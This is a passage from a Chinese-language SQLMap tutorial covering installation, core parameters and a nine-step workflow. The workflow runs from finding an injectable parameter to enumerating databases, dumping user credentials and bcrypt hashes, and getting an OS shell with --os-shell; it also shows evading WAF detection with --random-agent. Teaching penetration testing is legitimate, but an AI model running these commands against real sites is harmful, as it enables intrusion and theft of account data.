返回版本号=OK 不报错</text>  <defs><marker id="a270156320156" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="156" x2="320" y2="156" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270156320156)"/>  <defs><marker id="a680156720156" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="156" x2="720" y2="156" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680156720156)"/>  <defs><marker id="a270276320276" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="276" x2="320" y2="276" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270276320276)"/>  <defs><marker id="a680276720276" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="276" x2="720" y2="276" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680276720276)"/>  <defs><marker id="a270396320396" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="396" x2="320" y2="396" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270396320396)"/>  <defs><marker id="a680396720396" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="396" x2="720" y2="396" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680396720396)"/>  <rect x="30" y="500" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="516" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">Python 版本要求：3.7+（3.11/3.12 最佳性能）；不用单独 pip install（SQLMap 0 第三方依赖）</text>
</svg>

### Kali Linux（预装）

Kali Linux预装了SQLMap：
```bash
sqlmap --version
```

### Ubuntu/Debian 安装

```bash
sudo apt install sqlmap
```

### 源码安装（最新版）

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
cd ~/sqlmap
python3 sqlmap.py --version
```

---

## 4.5 基础注入命令详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss05" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss05g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s05dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss05g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss05dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-5 SQLMap 最基础注入命令 10 大参数拆解（新手照抄）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">最小命令 = 检测注入；加 --dbs/--tables/--dump = 枚举数据库；加 -p 指定参数不瞎扫</text>  <rect x="40" y="100" width="1000" height="56" rx="10" fill="#020617" stroke="#06b6d4" stroke-width="2"/>  <text x="540" y="136" text-anchor="middle" font-size="13" font-weight="700" fill="#67e8f9" font-family="Consolas,Monospace">sqlmap -u &quot;http://192.168.1.100/page?id=1&quot; --batch --random-agent --level 3 --risk 2 -p id --technique=BEUST --dbs</text>  <rect x="40" y="180" width="195" height="145" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="180" width="195" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="137.5" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">-u / --url</text>  <text x="137.5" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">目标注入 URL（必须带 ? 参数）</text>  <text x="137.5" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="137.5" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="245" y="180" width="195" height="145" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="245" y="180" width="195" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="342.5" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">--batch</text>  <text x="342.5" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">全程非交互默认选 Y（脚本化必备）</text>  <text x="342.5" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="342.5" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="450" y="180" width="195" height="145" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="450" y="180" width="195" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="547.5" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">--random-agent</text>  <text x="547.5" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">每请求换 UA，防 WAF 特征识别</text>  <text x="547.5" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="547.5" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="655" y="180" width="195" height="145" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="655" y="180" width="195" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="752.5" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">--level 1~5</text>  <text x="752.5" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">注入测试等级（默认 1，建议 ≥3）</text>  <text x="752.5" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="752.5" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="860" y="180" width="195" height="145" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="860" y="180" width="195" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="957.5" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">--risk 1~3</text>  <text x="957.5" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Payload 危险等级（3 才会测基于时间</text>  <text x="957.5" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">盲注）</text>  <text x="957.5" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="40" y="335" width="195" height="145" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="335" width="195" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="137.5" y="355" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">-p id</text>  <text x="137.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">指定注入参数（别全扫，省 70% 时间）</text>  <text x="137.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="137.5" y="417" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="245" y="335" width="195" height="145" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="245" y="335" width="195" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="342.5" y="355" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">--technique BEUST</text>  <text x="342.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">启用 5 种技术（O 需 DNSLog 单独</text>  <text x="342.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">开）</text>  <text x="342.5" y="417" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="450" y="335" width="195" height="145" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="450" y="335" width="195" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="547.5" y="355" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">--dbs / --tables / --columns</text>  <text x="547.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">枚举 数据库 / 表 / 列 三级递进</text>  <text x="547.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="547.5" y="417" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="655" y="335" width="195" height="145" rx="10" fill="#0f172a" stroke="#dc2626" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="655" y="335" width="195" height="30" rx="10" fill="#dc2626" opacity="0.20"/>  <text x="752.5" y="355" text-anchor="middle" font-size="13" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">--dump / --dump-all</text>  <text x="752.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">导出表数据 / 导出 DB 所有库数据</text>  <text x="752.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="752.5" y="417" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="860" y="335" width="195" height="145" rx="10" fill="#0f172a" stroke="#f97316" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="860" y="335" width="195" height="30" rx="10" fill="#f97316" opacity="0.20"/>  <text x="957.5" y="355" text-anchor="middle" font-size="13" font-weight="800" fill="#f97316" font-family="Microsoft YaHei,Arial">-r request.txt</text>  <text x="957.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">用 Burp 抓的 HTTP 请求文件注入（</text>  <text x="957.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">POST/COOKIE 首选）</text>  <text x="957.5" y="417" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">核心 8 字口诀：『检测(-u) → 枚举(--dbs) → 列(--columns) → 导(--dump)』，全流程不超 5 条命令</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss06" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss06g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s06dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss06g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss06dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-6 SQLMap 标准 9 步注入工作流（从小白到拿下 OS-Shell）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">9 步闭环 = 注入通用 SOP；任何 SQL 注入漏洞按此流程走一遍=不出错</text>  <rect x="20" y="180" width="160" height="135" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="20" y="180" width="160" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="100.0" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 目标识别</text>  <text x="100.0" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Burp 找可疑参数
?id= / ?p</text>  <text x="100.0" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">age= / POST 表单
?cat=</text>  <text x="100.0" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> / ?id2= / ?newsid=</text>  <rect x="185" y="180" width="160" height="135" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="185" y="180" width="160" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="265.0" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 注入点检测</text>  <text x="265.0" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-u URL --batch -p id</text>  <text x="265.0" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">
判断是否存在注入
显示 payload</text>  <text x="265.0" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">s = 注入点确认</text>  <rect x="350" y="180" width="160" height="135" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="350" y="180" width="160" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="430.0" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ DB 指纹识别</text>  <text x="430.0" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">自动显示：
DBMS = MySQL 8</text>  <text x="430.0" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">.0.35
OS = Linux + P</text>  <text x="430.0" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">HP/8.2 + WAF=无</text>  <rect x="515" y="180" width="160" height="135" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="515" y="180" width="160" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="595.0" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 列所有库</text>  <text x="595.0" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--dbs → 输出 5~10 个库
i</text>  <text x="595.0" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">nformation_schema / </text>  <text x="595.0" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">cisp_db /
mysql / pe</text>  <rect x="680" y="180" width="160" height="135" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="680" y="180" width="160" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="760.0" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 列所有表</text>  <text x="760.0" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-D cisp_db --tables
</text>  <text x="760.0" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">admin / users / orde</text>  <text x="760.0" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">rs /
articles / logs</text>  <rect x="845" y="180" width="160" height="135" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="845" y="180" width="160" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="925.0" y="200" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 列字段</text>  <text x="925.0" y="230" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-D cisp_db -T users </text>  <text x="925.0" y="246" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--columns
id / usern</text>  <text x="925.0" y="262" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">ame / password /
rol</text>  <rect x="20" y="345" width="160" height="135" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="20" y="345" width="160" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="100.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑦ dump 账号</text>  <text x="100.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-D cisp_db -T users </text>  <text x="100.0" y="411" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-C
username,password</text>  <text x="100.0" y="427" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">,role --dump
自动存 CSV</text>  <rect x="185" y="345" width="160" height="135" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="185" y="345" width="160" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="265.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑧ DB 账号权限</text>  <text x="265.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--users --privileges</text>  <text x="265.0" y="411" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">
看是否 FILE / SUPER 权限</text>  <text x="265.0" y="427" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">
决定能否读写文件/拿 Shell</text>  <rect x="350" y="345" width="160" height="135" rx="10" fill="#0f172a" stroke="#dc2626" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="350" y="345" width="160" height="30" rx="10" fill="#dc2626" opacity="0.20"/>  <text x="430.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">⑨ 拿系统 Shell</text>  <text x="430.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--file-read / --file</text>  <text x="430.0" y="411" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-write
--os-cmd whoa</text>  <text x="430.0" y="427" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">mi / --os-shell
→ 交互</text>  <defs><marker id="a180247185247" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="180" y1="247" x2="185" y2="247" stroke="#60a5fa" stroke-width="2" marker-end="url(#a180247185247)"/>  <defs><marker id="a345247350247" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="345" y1="247" x2="350" y2="247" stroke="#60a5fa" stroke-width="2" marker-end="url(#a345247350247)"/>  <defs><marker id="a510247515247" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="510" y1="247" x2="515" y2="247" stroke="#60a5fa" stroke-width="2" marker-end="url(#a510247515247)"/>  <defs><marker id="a675247680247" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="675" y1="247" x2="680" y2="247" stroke="#60a5fa" stroke-width="2" marker-end="url(#a675247680247)"/>  <defs><marker id="a840247845247" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="840" y1="247" x2="845" y2="247" stroke="#60a5fa" stroke-width="2" marker-end="url(#a840247845247)"/>  <defs><marker id="a10052471010247" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="1005" y1="247" x2="1010" y2="247" stroke="#60a5fa" stroke-width="2" marker-end="url(#a10052471010247)"/>  <defs><marker id="a180412185412" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="180" y1="412" x2="185" y2="412" stroke="#60a5fa" stroke-width="2" marker-end="url(#a180412185412)"/>  <defs><marker id="a345412350412" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="345" y1="412" x2="350" y2="412" stroke="#60a5fa" stroke-width="2" marker-end="url(#a345412350412)"/>  <defs><marker id="a340247252345" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#fde68a"/></marker></defs>  <line x1="340" y1="247" x2="252" y2="345" stroke="#fde68a" stroke-width="2" marker-end="url(#a340247252345)"/>  <rect x="277.0" y="284.0" width="38" height="18" rx="6" fill="#020617" stroke="#fde68a" opacity="0.9"/>  <text x="296.0" y="297.0" text-anchor="middle" font-size="10" font-weight="700" fill="#fde68a" font-family="Microsoft YaHei,Arial">换行→</text>  <defs><marker id="a505247412345" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#fde68a"/></marker></defs>  <line x1="505" y1="247" x2="412" y2="345" stroke="#fde68a" stroke-width="2" marker-end="url(#a505247412345)"/>  <rect x="439.5" y="284.0" width="38" height="18" rx="6" fill="#020617" stroke="#fde68a" opacity="0.9"/>  <text x="458.5" y="297.0" text-anchor="middle" font-size="10" font-weight="700" fill="#fde68a" font-family="Microsoft YaHei,Arial">换行→</text>  <rect x="530" y="350" width="510" height="125" rx="12" fill="#0f172a" stroke="#1e293b"/>  <text x="785" y="372" text-anchor="middle" font-size="13" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">实际典型输出：dump 出来的 users 表（admin 账号已高亮）</text>  <rect x="540" y="388" width="40" height="22" fill="#1e293b" stroke="#334155"/>  <text x="560.0" y="403" text-anchor="middle" font-size="11" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">ID</text>  <rect x="580" y="388" width="130" height="22" fill="#1e293b" stroke="#334155"/>  <text x="645.0" y="403" text-anchor="middle" font-size="11" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">用户名</text>  <rect x="710" y="388" width="270" height="22" fill="#1e293b" stroke="#334155"/>  <text x="845.0" y="403" text-anchor="middle" font-size="11" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">密码哈希(bcrypt)</text>  <rect x="980" y="388" width="70" height="22" fill="#1e293b" stroke="#334155"/>  <text x="1015.0" y="403" text-anchor="middle" font-size="11" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">角色</text>  <rect x="540" y="410" width="40" height="22" fill="#022c22" stroke="#334155"/>  <text x="544" y="425" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1</text>  <rect x="580" y="410" width="130" height="22" fill="#022c22" stroke="#334155"/>  <text x="584" y="425" font-size="10.5" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">admin</text>  <rect x="710" y="410" width="270" height="22" fill="#022c22" stroke="#334155"/>  <text x="714" y="425" font-size="9.5" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">$2a$10$N9qo8uLOickgx2ZMRZoMy</text>  <rect x="980" y="410" width="70" height="22" fill="#022c22" stroke="#334155"/>  <text x="984" y="425" font-size="10.5" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">超级管理员</text>  <rect x="540" y="432" width="40" height="22" fill="#0b1530" stroke="#334155"/>  <text x="544" y="447" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2</text>  <rect x="580" y="432" width="130" height="22" fill="#0b1530" stroke="#334155"/>  <text x="584" y="447" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">editor</text>  <rect x="710" y="432" width="270" height="22" fill="#0b1530" stroke="#334155"/>  <text x="714" y="447" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">$2a$10$4vK1b3J4d....</text>  <rect x="980" y="432" width="70" height="22" fill="#0b1530" stroke="#334155"/>  <text x="984" y="447" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">内容编辑</text>  <rect x="540" y="454" width="40" height="22" fill="#111c35" stroke="#334155"/>  <text x="544" y="469" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3</text>  <rect x="580" y="454" width="130" height="22" fill="#111c35" stroke="#334155"/>  <text x="584" y="469" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">user001</text>  <rect x="710" y="454" width="270" height="22" fill="#111c35" stroke="#334155"/>  <text x="714" y="469" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">$2a$10$7hK...</text>  <rect x="980" y="454" width="70" height="22" fill="#111c35" stroke="#334155"/>  <text x="984" y="469" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">普通用户</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">9 步走完=从『怀疑注入』→『拿到 OS Shell + 所有后台账号』，标准时间 ≤30 分钟</text>
</svg>

### 最简单的命令

```bash
sqlmap -u "http://target.example.com/product?id=1"
```

这是最基础的命令：
- `-u`：指定目标URL
- `id=1`：参数可能存在注入

SQLMap会自动：
1. 检测是否存在注入
2. 识别注入类型
3. 识别数据库类型
4. 提供后续操作选项

### 命令输出解析

```
[*] starting @ 10:00:00

[*] testing connection to the target URL
[*] testing if the target URL content is stable
[*] testing if GET parameter 'id' is dynamic
[*] heuristic (basic) test shows that GET parameter 'id' might be injectable
[*] testing SQL injection on GET parameter 'id'
[*] testing 'AND boolean-based injection'
[+] GET parameter 'id' appears to be 'AND boolean-based' injectable
[*] testing 'MySQL'...
[+] confirmation that the back-end DBMS is 'MySQL'
```

**关键信息：**
- `injectable`：发现注入点
- `MySQL`：数据库类型
- `boolean-based`：注入类型

### 重要参数详解

| 参数 | 说明 | 示例 |
|------|------|------|
| -u | 目标URL | `-u "http://target.com?id=1"` |
| -p | 指定测试参数 | `-p id` |
| --dbs | 列出所有数据库 | `--dbs` |
| --tables | 列出表名 | `--tables -D dbname` |
| --columns | 列出列名 | `--columns -D dbname -T tablename` |
| --dump | 提取数据 | `--dump -D dbname -T tablename` |
| --batch | 自动回答 | `--batch` |

---

